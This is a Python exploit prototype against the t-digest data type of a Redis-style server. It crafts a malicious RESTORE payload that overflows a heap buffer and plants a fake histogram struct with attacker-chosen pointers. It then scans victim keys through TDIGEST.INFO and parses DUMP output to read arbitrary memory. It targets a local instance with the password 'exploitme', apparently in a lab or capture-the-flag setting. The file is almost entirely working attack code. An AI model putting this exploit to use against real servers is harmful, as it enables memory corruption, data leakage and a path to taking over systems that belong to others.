#!/usr/bin/env python3
"""P88W_corrupt.py — prototype: terminate-controlled overflow + fake struct.

Geometry (calibrated per build): DEL victim K -> RESTORE pops K's weight
chunk as nodes_mean and K's struct slot as its own histogram. The mean loop
writes linearly from nodes_mean; at slot S it reaches its own struct. We
place a fake td_histogram at slot C (a victim's struct) and a termination
patch at slot S+3 (merged_nodes=0) so the mean loop exits cleanly and the
weight loop does nothing.

Payload means layout (S+4 doubles):
  [0 .. C)        filler 0.0
  [C .. C+9]      fake struct (10 doubles)
  [C+10 .. S+2]   filler 0.0
  [S+3]           cap/merged termination qword (merged=0)
"""
import os
import struct
import sys

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from P88W_lib import Resp, build_tdigest_payload, q2d, f2d


def build_corrupt_payload(S, C, fake_mean_addr, fake_weight_addr, k,
                          cap=0x40000000):
    assert C + 10 <= S + 3
    slots = [q2d(0)] * (S + 4)
    # fake struct at C
    slots[C + 0] = f2d(1.0)                       # compression
    slots[C + 1] = f2d(0.0)                       # min
    slots[C + 2] = f2d(0.0)                       # max
    slots[C + 3] = struct.pack("<II", cap, k)     # cap / merged_nodes
    slots[C + 4] = struct.pack("<II", 0, 0)       # unmerged_nodes / pad
    slots[C + 5] = q2d(0)                         # total_compressions
    slots[C + 6] = f2d(0.0)                       # merged_weight
    slots[C + 7] = f2d(0.0)                       # unmerged_weight
    slots[C + 8] = q2d(fake_mean_addr)            # nodes_mean -> X
    slots[C + 9] = q2d(fake_weight_addr)          # nodes_weight -> Y
    # own struct termination: compression/min/max = 0.0 (slots S,S+1,S+2),
    # cap/merged at S+3: merged=0 -> mean loop exits at i=S+4
    slots[S + 3] = struct.pack("<II", cap, 0)
    declared = S + 4
    return build_tdigest_payload(declared, slots, [], cap=declared)


def find_marker(r, nv, cap=0x40000000):
    """Probe victims for the fake-struct marker via TDIGEST.INFO."""
    want = str(cap).encode()
    hits = []
    for i in range(nv):
        info = r.cmd("TDIGEST.INFO", "v%d" % i)
        d = dict(zip(info[::2], info[1::2]))
        if d.get(b"Capacity") == want:
            hits.append((i, d))
    return hits


def parse_dump(payload):
    """Parse a tdigest DUMP payload -> dict of fields + mean/weight qwords."""
    assert payload[0] == 7
    pos = 1 + 9  # type + moduleid
    def rd_dbl(p):
        assert payload[p] == 4, (p, payload[p])
        return payload[p + 1:p + 9], p + 9
    def rd_uint(p):
        assert payload[p] == 2, (p, payload[p])
        b = payload[p + 1]
        if b < 0x40:
            return b, p + 2
        if b < 0x80:
            return ((b & 0x3F) << 8) | payload[p + 2], p + 3
        if b == 0x80:
            return struct.unpack(">I", payload[p + 2:p + 6])[0], p + 6
        if b == 0x81:
            return struct.unpack(">Q", payload[p + 2:p + 10])[0], p + 10
        raise ValueError("bad len")
    out = {}
    raw, pos = rd_dbl(pos); out["compression"] = raw
    raw, pos = rd_dbl(pos); out["min"] = raw
    raw, pos = rd_dbl(pos); out["max"] = raw
    out["cap"], pos = rd_uint(pos)
    out["merged"], pos = rd_uint(pos)
    out["unmerged"], pos = rd_uint(pos)
    out["compressions"], pos = rd_uint(pos)
    raw, pos = rd_dbl(pos); out["mweight"] = raw
    raw, pos = rd_dbl(pos); out["uweight"] = raw
    means = []
    for _ in range(out["merged"]):
        raw, pos = rd_dbl(pos)
        means.append(struct.unpack("<Q", raw)[0])
    weights = []
    for _ in range(out["merged"]):
        raw, pos = rd_dbl(pos)
        weights.append(struct.unpack("<Q", raw)[0])
    out["means"] = means
    out["weights"] = weights
    return out


if __name__ == "__main__":
    port = int(sys.argv[1])
    S = int(sys.argv[2])
    C = int(sys.argv[3])
    X = int(sys.argv[4], 16)
    Y = int(sys.argv[5], 16) if len(sys.argv) > 5 else X
    K = int(sys.argv[6]) if len(sys.argv) > 6 else 515
    nv = int(sys.argv[7]) if len(sys.argv) > 7 else 2000
    k = 8

    r = Resp("127.0.0.1", port, "exploitme")
    r.cmd("DEL", "v%d" % K)
    pay = build_corrupt_payload(S, C, X, Y, k)
    print("[*] payload %d bytes (S=%d C=%d X=%#x Y=%#x)" % (len(pay), S, C, X, Y))
    rep = r.cmd("RESTORE", "m:td", "0", pay, "REPLACE")
    print("[+] RESTORE ->", rep)
    hits = find_marker(r, nv)
    print("[+] marker victims:", [(i, d.get(b"Merged nodes")) for i, d in hits])
    for i, d in hits:
        payload = r.cmd("DUMP", "v%d" % i)
        parsed = parse_dump(payload)
        print("    v%d DUMP: cap=%#x merged=%d means=%s"
              % (i, parsed["cap"], parsed["merged"],
                 " ".join("%016x" % m for m in parsed["means"])))
    print("[*] PING:", r.cmd("PING"))
